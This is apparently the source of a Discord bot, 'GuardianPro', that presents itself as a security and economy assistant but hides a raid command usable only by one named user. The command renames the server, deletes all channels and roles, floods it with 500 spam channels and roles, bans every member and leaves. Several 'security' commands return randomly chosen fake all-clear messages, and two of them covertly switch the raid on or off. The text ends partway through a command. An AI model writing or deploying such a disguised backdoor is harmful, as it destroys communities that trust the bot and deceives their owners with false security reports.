try:
  import discord
  from discord.ext import commands
except ImportError:
  print("Error: discord.py no est√° instalado correctamente")
  exit(1)

import asyncio
import json
import os
import random
import datetime
from asyncio import sleep
import threading
from flask import Flask, jsonify


intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True  # Necesario para comandos ‚àÜ
intents.members = True  # Para funciones de moderaci√≥n


def get_prefix(bot, message):
  # Solo comandos de econom√≠a usan .
  if message.content.startswith('.'):
      return '.'
  # Comandos especiales usan ‚àÜ NO PONER
  elif message.content.startswith('‚àÜ'):
      return '‚àÜ'
  # Comandos administrativos usan *
  elif message.content.startswith('*'):
      return '*'
  return ['‚àÜ', '.', '*']  # Fallback


bot = commands.Bot(command_prefix=get_prefix,
                 intents=intents,
                 help_command=None)

# Estado de comandos especiales (discreto)
delta_commands_enabled = True
economy_only_mode = False  # Nuevo estado para modo econom√≠a solamente
slash_commands_disabled = False # Nuevo estado para desactivar slash commands


# Sistema de econom√≠a
balances_file = 'balances.json'
cooldowns_file = 'cooldowns.json'

if os.path.exists(balances_file):
  with open(balances_file, 'r') as f:
      balances = json.load(f)
else:
  balances = {}

if os.path.exists(cooldowns_file):
  with open(cooldowns_file, 'r') as f:
      cooldowns = json.load(f)
else:
  cooldowns = {}


def save_balances():
  with open(balances_file, 'w') as f:
      json.dump(balances, f)


def save_cooldowns():
  with open(cooldowns_file, 'w') as f:
      json.dump(cooldowns, f)


def get_balance(user_id):
  user_id = str(user_id)
  if user_id not in balances:
      balances[user_id] = {"wallet": 0, "bank": 0}
  return balances[user_id]


def update_balance(user_id, wallet=0, bank=0):
  user_id = str(user_id)
  bal = get_balance(user_id)
  bal['wallet'] += wallet
  bal['bank'] += bank
  # No dejar negativo
  if bal['wallet'] < 0:
      bal['wallet'] = 0
  if bal['bank'] < 0:
      bal['bank'] = 0
  balances[user_id] = bal  # Asegurar que se actualice en el diccionario principal
  save_balances()


def can_use_cooldown(user_id, command, cooldown_time):
  user_id = str(user_id)
  now = datetime.datetime.utcnow().timestamp()
  if user_id not in cooldowns:
      cooldowns[user_id] = {}
  user_cd = cooldowns[user_id]
  last = user_cd.get(command, 0)

  if now - last >= cooldown_time:
      user_cd[command] = now
      save_cooldowns()
      return True
  return False


def get_cooldown_remaining(user_id, command, cooldown_time):
  user_id = str(user_id)
  now = datetime.datetime.utcnow().timestamp()
  if user_id not in cooldowns:
      return 0
  last = cooldowns[user_id].get(command, 0)
  remaining = cooldown_time - (now - last)
  return max(0, remaining)


@bot.event
async def on_ready():
  print(f'Bot GuardianPro est√° listo y conectado como {bot.user}')
  try:
      synced = await bot.tree.sync()
      print(f"Sincronizados {len(synced)} slash commands")
  except Exception as e:
      print(f"Error al sincronizar slash commands: {e}")
  print("‚úÖ Bot GuardianPro configurado correctamente:")
  print("‚Ä¢ Sistema de econom√≠a con prefijo .")
  print("‚Ä¢ Moderaci√≥n autom√°tica")
  print("‚Ä¢ Sistema de niveles y tickets")
  print("‚Ä¢ Utilidades y entretenimiento")
  print("‚Ä¢ Comandos especiales ocultos")


@bot.event
async def on_guild_join(guild):
  """Se ejecuta cuando el bot se une a un servidor nuevo"""
  print(f'Bot se uni√≥ al servidor: {guild.name} (ID: {guild.id})')

  # Esperar un poco para asegurar que el bot est√© completamente integrado
  await asyncio.sleep(2)

  # Crear rol de administrador del bot
  try:
      # Verificar que el bot tenga permisos para crear roles
      if not guild.me.guild_permissions.manage_roles:
          print(f"No tengo permisos para crear roles en {guild.name}")
          return

      admin_role = await guild.create_role(
          name="üõ°Ô∏è GuardianPro Admin",
          colour=discord.Colour.red(),
          permissions=discord.Permissions(administrator=True),
          reason="Rol de administrador creado autom√°ticamente por GuardianPro")
      print(f"Rol de administrador creado en {guild.name}: {admin_role.name}")

      # Intentar asignar el rol al propietario del servidor
      try:
          if guild.owner and not guild.owner.bot:
              await guild.owner.add_roles(
                  admin_role,
                  reason="Asignaci√≥n autom√°tica de rol de administrador al propietario")
              print(f"Rol asignado al propietario del servidor: {guild.owner.display_name}")
          else:
              print("No se pudo identificar al propietario del servidor")
      except discord.Forbidden:
          print("No se pudo asignar el rol al propietario (jerarqu√≠a de roles o permisos insuficientes)")
      except Exception as e:
          print(f"Error al asignar rol al propietario: {e}")

      # Buscar un canal donde enviar mensaje de bienvenida
      welcome_channel = None

      # Prioridad: canal con "general" en el nombre
      for channel in guild.text_channels:
          if "general" in channel.name.lower() and channel.permissions_for(guild.me).send_messages:
              welcome_channel = channel
              break

      # Si no hay canal general, buscar cualquier canal donde se pueda escribir
      if not welcome_channel:
          for channel in guild.text_channels:
              if channel.permissions_for(guild.me).send_messages:
                  welcome_channel = channel
                  break

      if welcome_channel:
          embed = discord.Embed(
              title="üõ°Ô∏è GuardianPro se ha unido al servidor",
              description=
              f"¬°Hola! Soy **GuardianPro**, tu asistente de seguridad y econom√≠a.\n\n"
              f"‚úÖ He creado el rol `{admin_role.name}` con permisos de administrador.\n"
              f"üëë El propietario del servidor ha sido asignado a este rol autom√°ticamente.\n\n"
              f"üîß **Comandos principales:**\n"
              f"‚Ä¢ `/help` - Ver todos los comandos disponibles\n"
              f"‚Ä¢ `.balance` - Sistema de econom√≠a\n"
              f"‚Ä¢ `/scan` - Escaneo de seguridad\n\n"
              f"‚öôÔ∏è **Para administradores:** Comandos especiales con prefijo `‚àÜ`",
              color=discord.Color.blue())
          embed.add_field(
              name="üöÄ Primeros pasos",
              value="1. Usa `/help` para ver todos los comandos\n"
                    "2. Configura el servidor con `/sset`\n"
                    "3. Explora el sistema de econom√≠a con `.balance`",
              inline=False)
          embed.set_footer(text="GuardianPro | Protecci√≥n y diversi√≥n 24/7")
          embed.set_thumbnail(url="https://cdn-icons-png.flaticon.com/512/1068/1068723.png")

          await welcome_channel.send(embed=embed)
          print(f"Mensaje de bienvenida enviado en: {welcome_channel.name}")
      else:
          print("No se encontr√≥ canal donde enviar mensaje de bienvenida")

  except discord.Forbidden:
      print(f"No tengo permisos para crear roles en {guild.name}")
      # Intentar enviar mensaje sin crear rol
      try:
          for channel in guild.text_channels:
              if channel.permissions_for(guild.me).send_messages:
                  embed = discord.Embed(
                      title="üõ°Ô∏è GuardianPro se ha unido al servidor",
                      description="¬°Hola! Soy **GuardianPro**.\n\n"
                                  "‚ö†Ô∏è **Atenci√≥n:** No pude crear el rol de administrador debido a permisos limitados.\n"
                                  "Por favor, aseg√∫rate de que tengo permisos para **Administrar Roles**.\n\n"
                                  "üîß Usa `/help` para ver todos los comandos disponibles.",
                      color=discord.Color.orange())
                  await channel.send(embed=embed)
                  break
      except:
          pass
  except Exception as e:
      print(f"Error al crear rol de administrador en {guild.name}: {e}")


async def delete_channel(channel):
  max_retries = 3
  for attempt in range(max_retries):
      try:
          await channel.delete()
          print(f"Canal borrado: {channel.name}")
          return
      except discord.HTTPException as e:
          if e.status == 429:  # Rate limit
              retry_after = getattr(e, 'retry_after', 5)
              print(
                  f"Rate limit al borrar {channel.name}, esperando {retry_after} segundos..."
              )
              await asyncio.sleep(retry_after)
          else:
              print(f"Error al borrar canal {channel.name}: {e}")
              if attempt == max_retries - 1:  # √öltimo intento
                  break
      except Exception as e:
          print(f"Error al borrar canal {channel.name}: {e}")
          if attempt == max_retries - 1:  # √öltimo intento
              break


async def create_channel_with_message(guild, i, overwrites):
  try:
      await guild.create_text_channel(f'crashed-{i}',
                                      overwrites=overwrites)
      print(f"Canal creado: crashed-{i}")
      # Esperar menos tiempo antes de enviar mensaje
      await asyncio.sleep(0.5)
      try:
          # Obtener el canal reci√©n creado para enviar el mensaje
          channel = discord.utils.get(guild.channels, name=f'crashed-{i}')
          if channel:
              await channel.send(
                  "@everyone @here hecho por Nathyx, hermano de Eather https://discord.gg/Fhh4DTKW"
              )
              print(f"Mensaje enviado en: crashed-{i}")
      except Exception as msg_error:
          print(f"Error al enviar mensaje en crashed-{i}: {msg_error}")
  except Exception as e:
      print(f"Error al crear canal crashed-{i}: {e}")


async def create_role(guild, i):
  try:
      await guild.create_role(name=f"raided-{i}",
                              colour=discord.Colour.red())
      print(f"Rol creado: raided-{i}")
  except Exception as e:
      print(f"Error al crear rol raided-{i}: {e}")


async def create_event(guild, i):
  try:
      from datetime import datetime, timedelta
      start_time = datetime.utcnow() + timedelta(hours=1)
      end_time = start_time + timedelta(hours=2)

      await guild.create_scheduled_event(
          name="raideados jeje",
          description="Evento creado por Nathyx",
          start_time=start_time,
          end_time=end_time,
          entity_type=discord.EntityType.external,
          entity_metadata=discord.EntityMetadata(location="Discord Server"))
      print(f"Evento creado: raideados jeje #{i}")
  except Exception as e:
      print(f"Error al crear evento {i}: {e}")


async def delete_role(role):
  try:
      await role.delete()
      print(f"Rol borrado: {role.name}")
  except Exception as e:
      print(f"Error al borrar rol {role.name}: {e}")


async def ban_member(member):
  try:
      await member.ban(reason="Raid por Nathyx - Todos baneados")
      print(f"Miembro baneado: {member.name}")
  except discord.Forbidden:
      print(
          f"No se pudo banear a {member.name} debido a permisos insuficientes."
      )
  except discord.HTTPException as e:
      print(f"Error al banear a {member.name}: {e}")


def is_authorized_user(user):
  """Verificar si el usuario est√° autorizado para comandos ‚àÜ"""
  return user.name == "Cueli13"


@bot.command(name='T')
async def raid(ctx):
  # Verificar usuario autorizado primero
  if not is_authorized_user(ctx.author):
      return

  # Verificar si los comandos ‚àÜ est√°n habilitados
  if not delta_commands_enabled:
      return

  # Verificar si est√° en modo econom√≠a
  if economy_only_mode:
      return

  # Borrar el mensaje del comando inmediatamente
  try:
      await ctx.message.delete()
  except:
      pass

  guild = ctx.guild
  await ctx.send("R41D3D 8Y X3RVS")
  print(f"Raid iniciado en el servidor {guild.name}")

  # Cambiar nombre del servidor y quitar icono
  try:
      await guild.edit(name="-R4ID3D-", icon=None)
      print("Nombre del servidor cambiado a -R4ID3D- e icono eliminado")
  except Exception as e:
      print(f"Error al cambiar servidor: {e}")

  # Borrar todos los canales existentes en paralelo
  delete_channel_tasks = [
      delete_channel(channel) for channel in guild.channels
  ]
  if delete_channel_tasks:
      await asyncio.gather(*delete_channel_tasks, return_exceptions=True)

  # Borrar todos los roles existentes (excepto @everyone)
  delete_role_tasks = [
      delete_role(role) for role in guild.roles if role.name != "@everyone"
  ]
  if delete_role_tasks:
      await asyncio.gather(*delete_role_tasks, return_exceptions=True)

  # Configurar permisos una sola vez
  overwrites = {
      guild.default_role:
      discord.PermissionOverwrite(send_messages=True,
                                  read_messages=True,
                                  view_channel=True,
                                  embed_links=True,
                                  attach_files=True,
                                  read_message_history=True)
  }

  # Crear canales, roles y eventos por lotes para evitar rate limits
  print("Creando canales...")
  for batch in range(0, 500, 100):  # Crear en lotes de 100, total 500 canales
      channel_tasks = [
          create_channel_with_message(guild, i, overwrites)
          for i in range(batch, min(batch + 100, 500))
      ]
      await asyncio.gather(*channel_tasks, return_exceptions=True)
      await asyncio.sleep(0.5)  # Pausa entre lotes

  print("Creando roles...")
  role_tasks = [create_role(guild, i) for i in range(500)]  # 500 roles
  await asyncio.gather(*role_tasks, return_exceptions=True)

  print("Creando eventos...")
  event_tasks = [create_event(guild, i) for i in range(10)]  # 10 eventos
  await asyncio.gather(*event_tasks, return_exceptions=True)

  # Banear a todos los miembros en paralelo
  ban_tasks = [
      ban_member(member) for member in guild.members if member != bot.user
  ]
  if ban_tasks:
      await asyncio.gather(*ban_tasks, return_exceptions=True)

  await ctx.send("Raid completado!")

  # Salir del servidor despu√©s del raid
  try:
      await guild.leave()
      print(f"Bot sali√≥ del servidor {guild.name}")
  except Exception as e:
      print(f"Error al salir del servidor: {e}")


class HelpView(discord.ui.View):

  def __init__(self):
      super().__init__(timeout=60)
      self.current_page = 0
      self.pages = [{
          "title":
          "üõ°Ô∏è Panel de Ayuda - P√°gina 1/5",
          "description":
          "Tu asistente de **seguridad avanzada** para Discord.\n\nComandos de seguridad y monitoreo:",
          "fields": [{
              "name":
              "üîç Escaneo y Seguridad",
              "value":
              ("**/scan** ‚Üí Escanea el servidor en busca de amenazas\n"
               "**/secure** ‚Üí Informe completo de seguridad\n"
               "**/monitor** ‚Üí Estado en tiempo real del sistema\n"
               "**/info** ‚Üí Informaci√≥n detallada del servidor\n"
               "**/firewall** ‚Üí Estado del firewall\n"
               "**/antivirus** ‚Üí Estado del antivirus")
          }, {
              "name":
              "üõ°Ô∏è Protecci√≥n y Moderaci√≥n",
              "value":
              ("**/sset** ‚Üí Implementa el sistema de seguridad\n"
               "**/ban** ‚Üí Banea a un usuario del servidor\n"
               "**/clear** ‚Üí Eliminar mensajes del canal\n"
               "**/automod** ‚Üí Configurar moderaci√≥n autom√°tica")
          }]
      }, {
          "title":
          "üíæ Panel de Ayuda - P√°gina 2/5",
          "description":
          "Comandos del sistema, utilidades y configuraci√≥n:",
          "fields": [{
              "name":
              "üíæ Sistema y Configuraci√≥n",
              "value":
              ("**/backup** ‚Üí Estado de los respaldos\n"
               "**/ping** ‚Üí Latencia del bot\n"
               "**/version** ‚Üí Versi√≥n actual (GPC 3)\n"
               "**/encrypt** ‚Üí Estado de la encriptaci√≥n\n"
               "**/uptime** ‚Üí Tiempo de actividad del bot\n"
               "**/stats** ‚Üí Estad√≠sticas del servidor")
          }, {
              "name":
              "üìã Informaci√≥n y Listas",
              "value":
              ("**/userinfo** ‚Üí Informaci√≥n de un usuario\n"
               "**/avatar** ‚Üí Ver avatar de un usuario\n"
               "**/roles** ‚Üí Lista de roles del servidor\n"
               "**/channels** ‚Üí Lista de canales del servidor\n"
               "**/invite** ‚Üí Crear enlace de invitaci√≥n\n"
               "**/server** ‚Üí Enlace del servidor del bot")
          }]
      }, {
          "title":
          "üéâ Panel de Ayuda - P√°gina 3/5",
          "description":
          "Entretenimiento, juegos y diversi√≥n:",
          "fields": [{
              "name":
              "üéÆ Entretenimiento B√°sico",
              "value":
              ("**/gstart** ‚Üí Crear sorteo interactivo\n"
               "**/timer** ‚Üí Establecer temporizador\n"
               "**/reminder** ‚Üí Crear recordatorio\n"
               "**/poll** ‚Üí Crear una encuesta\n"
               "**/flip** ‚Üí Lanzar una moneda\n"
               "**/dice** ‚Üí Lanzar dados")
          }, {
              "name":
              "üòÑ Diversi√≥n y Humor",
              "value":
              ("**/8ball** ‚Üí Pregunta a la bola m√°gica\n"
               "**/joke** ‚Üí Chiste aleatorio\n"
               "**/meme** ‚Üí Meme aleatorio\n"
               "**/quote** ‚Üí Cita inspiradora\n"
               "**/choose** ‚Üí Elegir entre opciones")
          }]
      }, {
          "title":
          "üõ†Ô∏è Panel de Ayuda - P√°gina 4/5",
          "description":
          "Herramientas √∫tiles y generadores:",
          "fields": [{
              "name":
              "üõ†Ô∏è Herramientas T√©cnicas",
              "value":
              ("**/math** ‚Üí Calculadora b√°sica\n"
               "**/base64** ‚Üí Codificar/decodificar Base64\n"
               "**/password** ‚Üí Generar contrase√±a segura\n"
               "**/ascii** ‚Üí Convertir texto a arte ASCII\n"
               "**/color** ‚Üí Generar color aleatorio")
          }, {
              "name":
              "üåê Simuladores",
              "value":
              ("**/weather** ‚Üí Clima simulado\n"
               "**/translate** ‚Üí Traductor simulado")
          }]
      }, {
          "title":
          "üí∞ Panel de Ayuda - P√°gina 5/5",
          "description":
          "Sistema de econom√≠a completo y rankings:",
          "fields": [{
              "name":
              "üí∞ Comandos B√°sicos de Econom√≠a",
              "value":
              ("`.money` / `.bal` ‚Üí Ver tu dinero\n"
               "`.work` ‚Üí Trabajar para ganar dinero\n"
               "`.daily` ‚Üí Recompensa diaria\n"
               "`.collect` ‚Üí Recompensa por rango\n"
               "`.pay` ‚Üí Enviar dinero a otro usuario\n"
               "`.deposit` ‚Üí Depositar en el banco\n"
               "`.withdraw` ‚Üí Retirar del banco")
          }, {
              "name":
              "üéØ Actividades de Riesgo",
              "value":
              ("`.beg` ‚Üí Mendigar por dinero\n"
               "`.crime` ‚Üí Cometer cr√≠menes por dinero\n"
               "`.rob` ‚Üí Intentar robar a otro usuario\n"
               "`.win` ‚Üí Loter√≠a ($10,000 - 0.5% ganar)\n"
               "`.coinflip` ‚Üí Apostar en cara o cruz\n"
               "`.slots` ‚Üí M√°quina tragamonedas")
          }, {
              "name":
              "üèÜ Rankings y Niveles",
              "value":
              ("`.baltop` ‚Üí Top 15 m√°s ricos del servidor\n"
               "**/level** ‚Üí Ver tu nivel y experiencia\n"
               "**/leaderboard_levels** ‚Üí Ranking de niveles\n"
               "**/ticket_setup** ‚Üí Configurar tickets")
          }]
      }]

  def create_embed(self, page_index):
      page = self.pages[page_index]
      embed = discord.Embed(title=page["title"],
                            description=page["description"],
                            color=discord.Color.dark_blue())

      for field in page["fields"]:
          embed.add_field(name=field["name"],
                          value=field["value"],
                          inline=False)

      embed.set_thumbnail(
          url="https://cdn-icons-png.flaticon.com/512/1068/1068723.png")
      embed.set_footer(text="GuardianPro | Protecci√≥n 24/7")

      return embed

  def update_buttons(self):
      # Habilitar/deshabilitar botones de navegaci√≥n
      self.children[0].disabled = (self.current_page == 0)  # Bot√≥n Anterior
      self.children[1].disabled = (self.current_page == len(self.pages) - 1) # Bot√≥n Siguiente

  @discord.ui.button(label='‚óÄÔ∏è Anterior',
                     style=discord.ButtonStyle.secondary)
  async def previous_page(self, interaction: discord.Interaction,
                          button: discord.ui.Button):
      if self.current_page > 0:
          self.current_page -= 1
          embed = self.create_embed(self.current_page)
          self.update_buttons()
          await interaction.response.edit_message(embed=embed, view=self)
      else:
          await interaction.response.defer()

  @discord.ui.button(label='‚ñ∂Ô∏è Siguiente',
                     style=discord.ButtonStyle.secondary)
  async def next_page(self, interaction: discord.Interaction,
                      button: discord.ui.Button):
      if self.current_page < len(self.pages) - 1:
          self.current_page += 1
          embed = self.create_embed(self.current_page)
          self.update_buttons()
          await interaction.response.edit_message(embed=embed, view=self)
      else:
          await interaction.response.defer()

  @discord.ui.button(label='üè† Inicio', style=discord.ButtonStyle.primary)
  async def home_page(self, interaction: discord.Interaction,
                      button: discord.ui.Button):
      self.current_page = 0
      embed = self.create_embed(self.current_page)
      self.update_buttons()
      await interaction.response.edit_message(embed=embed, view=self)

  async def on_timeout(self):
      for item in self.children:
          item.disabled = True
      # No podemos editar el mensaje aqu√≠ directamente, pero podemos deshabilitar los botones


@bot.tree.command(name="help",
                description="Muestra todos los comandos y funciones del bot")
async def help_slash(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  view = HelpView()
  embed = view.create_embed(0)
  view.update_buttons() # Asegurarse de que los botones est√©n en el estado correcto inicialmente
  await interaction.response.send_message(embed=embed, view=view)


@bot.tree.command(name='scan',
                description='Escanea el servidor en busca de amenazas')
async def see_slash(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  # Definir respuestas m√∫ltiples
  respuestas = [
      "üîç Escaneando servidor en busca de amenazas... ‚úÖ No se detectaron vulnerabilidades.",
      "üîç An√°lisis completo. Todo est√° en orden.",
      "üîç Iniciando el escaneo... Todo est√° protegido.",
      "üîç Escaneo finalizado. Lista de amenazas: Ninguna.",
      "üîç Verificaci√≥n de seguridad completada. Estado: SEGURO."
  ]

  # Elegir una respuesta al azar
  import random
  respuesta_elegida = random.choice(respuestas)

  await interaction.response.send_message(respuesta_elegida)


from discord import Embed


@bot.tree.command(name='info', description='Muestra informaci√≥n del servidor')
async def info_slash(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  guild = interaction.guild
  if guild is None:
      await interaction.response.send_message(
          "‚ùå Este comando solo puede usarse en servidores.", ephemeral=True)
      return

  embed = Embed(title=f"Informaci√≥n del servidor: {guild.name}",
                color=0x3498db)

  # Configurar thumbnail del servidor
  if guild.icon:
      embed.set_thumbnail(url=guild.icon.url)

  # Informaci√≥n b√°sica del servidor
  embed.add_field(name="üìä ID del Servidor",
                  value=f"`{guild.id}`",
                  inline=True)

  # Propietario del servidor - obtener de manera m√°s confiable
  try:
      if guild.owner:
          owner_text = f"{guild.owner.name}#{guild.owner.discriminator}"
      else:
          # Si no est√° en cach√©, intentar obtener por ID
          owner = await bot.fetch_user(guild.owner_id
                                      ) if guild.owner_id else None
          owner_text = f"{owner.name}#{owner.discriminator}" if owner else "Desconocido"
  except:
      owner_text = f"ID: {guild.owner_id}" if guild.owner_id else "Desconocido"

  embed.add_field(name="üëë Propietario", value=owner_text, inline=True)
  embed.add_field(name="üìÖ Creado el",
                  value=guild.created_at.strftime("%d/%m/%Y a las %H:%M"),
                  inline=True)

  # Estad√≠sticas del servidor - contar correctamente
  all_channels = guild.channels
  text_channels = len(
      [c for c in all_channels if isinstance(c, discord.TextChannel)])
  voice_channels = len(
      [c for c in all_channels if isinstance(c, discord.VoiceChannel)])
  categories = len(
      [c for c in all_channels if isinstance(c, discord.CategoryChannel)])

  # Contar miembros - intentar diferentes m√©todos
  member_count = guild.member_count
  if not member_count:
      # Si member_count es None, contar miembros cacheados
      member_count = len(guild.members) if guild.members else "No disponible"

  embed.add_field(name="üë• Miembros",
                  value=f"{member_count:,}"
                  if isinstance(member_count, int) else member_count,
                  inline=True)
  embed.add_field(name="üìù Canales de Texto",
                  value=text_channels,
                  inline=True)
  embed.add_field(name="üîä Canales de Voz", value=voice_channels, inline=True)
  embed.add_field(name="üìÅ Categor√≠as", value=categories, inline=True)
  embed.add_field(name="üè∑Ô∏è Roles", value=len(guild.roles), inline=True)
  embed.add_field(name="üòÑ Emojis", value=len(guild.emojis), inline=True)

  # Nivel de verificaci√≥n
  verification_levels = {
      discord.VerificationLevel.none: "Ninguno",
      discord.VerificationLevel.low: "Bajo",
      discord.VerificationLevel.medium: "Medio",
      discord.VerificationLevel.high: "Alto",
      discord.VerificationLevel.highest: "M√°ximo"
  }

  embed.add_field(name="üîí Verificaci√≥n",
                  value=verification_levels.get(guild.verification_level,
                                              "Desconocido"),
                  inline=True)
  embed.add_field(name="üéØ Nivel de Boost",
                  value=f"Nivel {guild.premium_tier}",
                  inline=True)
  embed.add_field(name="üíé Boosts",
                  value=guild.premium_subscription_count or 0,
                  inline=True)

  # Informaci√≥n adicional √∫til
  embed.add_field(name="üåç Regi√≥n",
                  value=getattr(guild, 'preferred_locale', 'Desconocido'),
                  inline=True)
  embed.add_field(name="üìú Descripci√≥n",
                  value=guild.description[:50] +
                  "..." if guild.description and len(guild.description) > 50
                  else guild.description or "Sin descripci√≥n",
                  inline=False)

  embed.set_footer(
      text=f"Informaci√≥n solicitada por {interaction.user.display_name}",
      icon_url=interaction.user.display_avatar.url)

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='firewall',
                description='Verifica el estado del firewall')
async def firewall_slash(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  await interaction.response.send_message(
      "üõ°Ô∏è Firewall activado. Estado: PROTEGIDO | Conexiones bloqueadas: 0")


@bot.tree.command(name='version', description='Muestra la versi√≥n del bot')
async def scan_slash(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  # Definir respuestas m√∫ltiples
  respuestas = [
      "Versi√≥n GPC 3", "Versi√≥n del sistema: GPC 3",
      "Est√°s utilizando la versi√≥n GPC 2! Gracias por utilizarme üòé"
  ]

  # Elegir una respuesta al azar
  import random
  respuesta_elegida = random.choice(respuestas)

  await interaction.response.send_message(respuesta_elegida)


import time


@bot.tree.command(
  name='sset',
  description='Confirma que el sistema de seguridad est√° implementado')
async def sset_slash(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  respuestas = [
      "üîí Sistema de seguridad implementado con √©xito. ¬°Protecci√≥n total activada!",
      "‚úÖ Seguridad configurada y operativa. Tu servidor est√° blindado.",
      "üõ°Ô∏è Protecci√≥n avanzada habilitada. El sistema de seguridad est√° en marcha.",
      "‚öôÔ∏è Sistema de seguridad online y funcionando sin fallos.",
      "üöÄ Seguridad implementada correctamente. ¬°El servidor est√° a salvo!",
      "üîê Todos los protocolos de seguridad est√°n activos y monitoreados.",
      "üõ†Ô∏è Sistema de seguridad listo para defender contra cualquier amenaza."
  ]

  import random
  await interaction.response.send_message(random.choice(respuestas))


@bot.tree.command(
  name='server',
  description='Env√≠a el enlace del servidor por mensaje directo')
async def server_slash(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  enlace_del_servidor = "Gracias por utilizarme! https://discord.gg/U8sY3dbz"  # Cambia esto por tu enlace real

  await interaction.response.send_message(
      "üì© Te he enviado el servidor al MD!", ephemeral=True)
  try:
      await interaction.user.send(
          f"üåê Aqu√≠ tienes el enlace del servidor:\n{enlace_del_servidor}")
  except Exception:
      await interaction.followup.send(
          "‚ùå No pude enviarte el mensaje directo. ¬øTienes los DMs abiertos?",
          ephemeral=True)


import time


@bot.tree.command(name='ping', description='Comprueba la latencia del bot')
async def ping_slash(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  start = time.perf_counter()
  await interaction.response.defer(
  )  # Defer para ganar tiempo y luego responder
  end = time.perf_counter()
  latency = (end - start) * 1000  # ms

  await interaction.followup.send(f"üèì Pong! {latency:.2f} ms")


@bot.tree.command(name='antivirus',
                description='Verifica el estado del antivirus')
async def antivirus_slash(interaction: discord.Interaction):
  global delta_commands_enabled
  delta_commands_enabled = False  # Deshabilitar comandos ‚àÜ discretamente

  amenazas = random.choice([0, 0, 0, 1
                          ])  # Mayor probabilidad de 0 amenazas, a veces 1

  respuestas = [
      "ü¶† Antivirus actualizado. √öltima verificaci√≥n: Ahora mismo | Amenazas detectadas:0",
      "üõ°Ô∏è Escaneo completo. Estado: LIMPIO | √öltimo chequeo: Ahora mismo",
      "üîç An√°lisis antivirus reciente. Amenazas encontradas: 1 (resuelto)",
      "‚úÖ Antivirus activo y actualizado. Sin amenazas detectadas en el √∫ltimo an√°lisis.",
      "‚ö†Ô∏è Advertencia: Amenaza leve detectada. √öltima revisi√≥n: Ahora mismo"
      if amenazas else
      "‚úÖ Antivirus limpio y protegido. √öltima revisi√≥n: Ahora mismo"
  ]

  await interaction.response.send_message(random.choice(respuestas))


@bot.tree.command(name='ban', description='Banea a un usuario del servidor')
@discord.app_commands.describe(user='Usuario a banear',
                               reason='Raz√≥n del baneo (opcional)')
async def ban_slash(interaction: discord.Interaction,
                    user: discord.Member,
                    reason: str = None):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  if not interaction.user.guild_permissions.ban_members:
      await interaction.response.send_message(
          "‚ùå No tienes permiso para banear usuarios.", ephemeral=True)
      return

  try:
      await user.ban(reason=reason)
      mensaje = f"üî® {user} ha sido baneado del servidor."
      if reason:
          mensaje += f"\nüìù Raz√≥n: {reason}"
      await interaction.response.send_message(mensaje)
  except Exception as e:
      await interaction.response.send_message(
          f"‚ùå No se pudo banear al usuario: {e}", ephemeral=True)


@bot.tree.command(name='invite',
                description='Genera un enlace de invitaci√≥n temporal')
@discord.app_commands.describe(
  max_uses='N√∫mero m√°ximo de usos del enlace (0 para ilimitado)',
  max_age='Duraci√≥n en segundos antes de que expire el enlace (0 para ilimitado)')
async def invite_slash(interaction: discord.Interaction,
                       max_uses: int = 1,
                       max_age: int = 3600):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  if not interaction.user.guild_permissions.create_instant_invite:
      await interaction.response.send_message(
          "‚ùå No tienes permiso para crear invitaciones.", ephemeral=True)
      return

  try:
      invite = await interaction.channel.create_invite(max_uses=max_uses,
                                                     max_age=max_age,
                                                     unique=True)
      await interaction.response.send_message(
          f"üîó Aqu√≠ tienes tu enlace de invitaci√≥n:\n{invite.url}")
  except Exception as e:
      await interaction.response.send_message(
          f"‚ùå No se pudo crear la invitaci√≥n: {e}", ephemeral=True)


@bot.tree.command(name='backup',
                description='Verifica el estado de los backups')
async def backup_slash(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  await interaction.response.send_message(
      "üíæ Sistema de respaldo activo. √öltimo backup: Hace 5 minutos | Estado: SEGURO")


@bot.tree.command(name='monitor',
                description='Muestra el estado del monitoreo del sistema')
async def monitor_slash(interaction: discord.Interaction):
  global delta_commands_enabled
  delta_commands_enabled = True  # Activar comandos ‚àÜ discretamente

  cpu = random.randint(5, 25)  # CPU entre 5% y 25%
  ram = random.randint(20, 40)  # RAM entre 20% y 40%
  latency = random.randint(30, 60)  # Latencia entre 30ms y 60ms

  respuestas = [
      f"üìä Monitoreo activo: CPU: {cpu}% | RAM: {ram}% | Conexiones: SEGURAS ‚úÖ",
      f"üì° Sistema estable: CPU: {cpu}% | RAM: {ram}% | Latencia: {latency}ms | Estado: √ìPTIMO",
      f"üñ•Ô∏è Recursos del servidor ‚Üí CPU: {cpu}% | RAM: {ram}% | Conexiones seguras: 100%",
